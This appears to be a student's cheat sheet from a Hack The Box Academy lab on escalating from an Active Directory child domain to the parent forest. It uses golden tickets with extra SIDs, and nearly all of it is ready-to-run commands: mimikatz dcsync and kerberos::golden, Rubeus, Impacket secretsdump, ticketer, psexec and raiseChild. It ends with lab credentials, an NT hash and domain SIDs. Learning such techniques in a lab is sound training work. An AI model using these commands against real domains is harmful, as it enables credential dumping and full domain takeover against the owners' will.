# Path Attack

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.

# Windows
- KRBTGT hash and FQDN 
```
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
- SID
```
Get-DomainSID
```
- Enterprise Admins Group's SID
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
Creating a Golden Ticket with Mimikatz
```
mimikatz.exe
kerberos::golden /user:NAME /domain:FQDN /sid:USERSID /krbtgt:KRBTGT /sids:DOMAINSID /ptt

.\Rubeus.exe golden /rc4:KRBTGT /domain:FQDN /sid:USERSID  /sids:ADMINSID /user:USER /ptt
```
Confirming the attack
```
klist
```
Attack
```
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

# Linux

- KRBTGT hash and FQDN 
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
- SID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
- Enterprise Admins Group's SID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
Creating a Golden Ticket with Mimikatz
```
ticketer.py -nthash KRBTGT -domain FQDN -domain-sid USERSID -extra-sid ADMINSID hacker
```
EXPORTING
```
export KRB5CCNAME=hacker.ccache 
```
Attack
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
HTB_@cademy_stdnt_admin!

9d765b482771505cbe97411065964d5f

-domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114
 hacker 

raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
